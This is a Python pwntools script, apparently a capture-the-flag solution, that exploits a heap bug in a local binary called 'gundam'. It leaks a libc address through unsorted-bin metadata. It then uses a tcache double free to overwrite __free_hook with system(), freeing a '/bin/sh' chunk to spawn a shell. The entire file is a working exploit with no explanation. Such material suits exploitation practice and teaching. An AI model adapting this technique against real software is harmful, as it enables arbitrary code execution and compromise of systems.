#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
#  context.log_level = "debug"

def build(name):
    io.sendlineafter(' :', "1")
    io.sendafter(' :', name)
    io.sendlineafter(' :', "1")

def visit():
    io.sendlineafter(' :', "2")

def destory(idx):
    io.sendlineafter(' :', "3")
    io.sendlineafter(":", str(idx))

def blow():
    io.sendlineafter(' :', "4")

io = process("./gundam", env = {"LD_PRELOAD": "./libc.so.6"})
libc = ELF("./libc.so.6")

for i in xrange(9):
    build("AAAA")
for i in xrange(9):
    destory(i)  # 7 tcache bins, 2 unsorted bins

blow()
for i in xrange(8):
    build('BBBBBBBB')

build('CCCCCCCC')
visit()

main_arena = 0x3dac20
libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 88 - main_arena
success("libc -> {:#x}".format(libc.address))

for i in xrange(8):
    destory(i)
blow()

build("0000")
build("/bin/sh\0")
build("2222")
destory(0)
destory(0)
build(p64(libc.sym['__free_hook'] - 0x10))
build("/bin/sh\0")
build(p64(libc.sym['system']) * 3)
destory(1)

io.interactive()
